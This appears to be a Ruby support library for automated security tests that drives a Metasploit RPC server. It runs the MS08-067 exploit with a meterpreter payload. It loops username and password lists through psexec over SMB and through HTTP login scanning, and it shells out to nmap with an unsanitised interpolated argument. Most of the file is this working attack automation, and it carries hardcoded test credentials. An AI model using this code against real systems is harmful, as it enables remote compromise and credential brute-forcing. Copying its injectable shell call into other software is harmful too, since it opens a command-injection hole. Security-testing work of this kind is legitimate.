$:.unshift(File.join(File.dirname(__FILE__), '..', '..', '..', '..', '..', 'lib'))

require 'msfrpc-client'
#require 'rex"

module Metaworld

	class Metadata
		attr_accessor :files

		def initialize
			@files = "/home/jcran/framework/external/metacuke/data"
		end
	end

	#
	# This class wraps the RPC connection and handles passing the token around
	class Client
	
		attr_accessor :rpc
		attr_accessor :token
	
		def initialize
			system = "127.0.0.1"
			username = "test"
			password = "test"
			port = "55553"
			
			begin
				# Make the connection with the msfrpc-client gem -- note that this handles the 
				# token for us, so we should only need to authenticate up front, then make 
				# the calls via the rpc object. 
				@rpc  = Msf::RPC::Client.new(:host => system, :port => port, :ssl => true, :user => "test", :pass => "test" )
			rescue Exception => e
				raise "Unable to connect: #{e}"
				exit
			end
		end

	end
	
	#
	# Below you'll find methods that can be called directly in step 
	# definitions. TODO - segment this up a bit and make more OO
	#

	def setup
		@client = Client.new
	end
	
	def scan_network(range)
		`nmap -oX /tmp/test #{range}`
	end

	def get_session_count
		self.setup unless @client
		session_list = @client.rpc.call("session.list")
		
		if session_list
			return session_list.count
		else
			return 0 
		end
	end

	def get_valid_cred_count
		self.setup unless @client
		cred_list = @client.rpc.call("db.creds", {})
		
		if cred_list
			return cred_list.count
		else
			return 0 
		end
	end

	def check_logins(type="smb",systems,usernames,passwords)
		self.setup unless @client

		systems = systems.split("\n")
		usernames = usernames.split("\n")
		passwords = passwords.split("\n")

		if type == "smb"
			_check_smb(systems,usernames,passwords)
		elsif type == "ssh"
			_check_ssh(systems,usernames,passwords)
		elsif type == "http"
			_check_http(systems,usernames,passwords)
		else 
			raise "Don't know how to test for that"
		end
	end

	def run_module(module_name, systems, options={})
		self.setup unless @client
		systems = systems.split("\n")
	
		systems.each do |system|
		
			# This is where we can do the appropriate setup for each module that we
			# want to run. 
			if module_name == "windows/smb/ms08_067_netapi"
						module_type = "exploit"
						module_name = "exploit/windows/smb/ms08_067_netapi"
						payload_name = "windows/meterpreter/bind_tcp"
						options_string = "RHOST=#{systems}"
			else 
				raise "Don't know how to test for that"
			end		

			# This stuff should be consistent acreoss modules
 			# -----------------------------------------------
			# Start out with an empty settings hash	and pull out each of the options
			options_hash = {}

			# Set a default payload unless it's already been set by the user
			options_hash["PAYLOAD"] = "windows/meterpreter/bind_tcp" unless options_hash["PAYLOAD"]

			# Set a default target unless it's already been set by the user
			options_hash["TARGET"] = 0 unless options_hash["TARGET"]

			#puts
			#puts "DEBUG: Module type: #{module_type}"
			#puts "DEBUG: Module name: #{module_name}"
			#puts "DEBUG: Options Hash: #{options_hash}"
			#puts "DEBUG: Method: module.execute"
			#puts "DEBUG: Token: #{@client.token}"
			#puts
			
			# then call execute
			@client.rpc.call("module.execute", module_type, module_name, options_hash)	
		end
	end

private
	def _check_ssh
		raise "Don't know how to test ssh" 		
	end
	
	def _check_http(systems,usernames,passwords)
		systems.each do |system|
			usernames.each do |username|
				passwords.each do |password|
					module_type = "exploit"
					module_name = "auxiliary/scanner/http/http_login"
					options_string = "RHOSTS=#{system},USERNAME=#{username},PASSWORD=#{password}"
	
					# Start out with an empty settings hash	and pull out each of the options
					options_hash = {}
					options_string.split(",").each{ |setting| options_hash["#{setting.split("=").first}"] = setting.split("=").last }

					# Set a default payload unless it's already been set by the user
					options_hash["PAYLOAD"] = "windows/meterpreter/bind_tcp" unless options_hash["PAYLOAD"]
	
					# Set a default target unless it's already been set by the user
					options_hash["TARGET"] = 0 unless options_hash["TARGET"]
		
					#puts
					#puts "DEBUG: Module type: #{module_type}"
					#puts "DEBUG: Module name: #{module_name}"
					#puts "DEBUG: Options Hash: #{options_hash}"
					#puts "DEBUG: Method: module.execute"
					#puts "DEBUG: Token: #{@client.token}"
					#puts
			
					# then call execute
					begin
						@client.rpc.call("module.execute", module_type, module_name, options_hash)	
					rescue Exception => e
						puts "DEBUG: exception #{e}"
					end

				end
			end
		end
	end
	
	def _check_smb(systems,usernames,passwords)
		systems.each do |system|
			usernames.each do |username|
				passwords.each do |password|
					module_type = "exploit"
					module_name = "windows/smb/psexec"
					payload_name = "windows/meterpreter/bind_tcp"
					options_string = "SMBUser=#{username},SMBPass=#{password},RHOST=#{system}"
	
					# Start out with an empty settings hash	and pull out each of the options
					options_hash = {}
					options_string.split(",").each{ |setting| options_hash["#{setting.split("=").first}"] = setting.split("=").last }

					# Set a default payload unless it's already been set by the user
					options_hash["PAYLOAD"] = "windows/meterpreter/bind_tcp" unless options_hash["PAYLOAD"]
	
					# Set a default target unless it's already been set by the user
					options_hash["TARGET"] = 0 unless options_hash["TARGET"]
		
					#puts
					#puts "DEBUG: Module type: #{module_type}"
					#puts "DEBUG: Module name: #{module_name}"
					#puts "DEBUG: Options Hash: #{options_hash}"
					#puts "DEBUG: Method: module.execute"
					#puts "DEBUG: Token: #{@client.token}"
					#puts
					
					# then call execute
				  @client.rpc.call("module.execute", module_type, module_name, options_hash)

				end
			end
		end		
	end

end
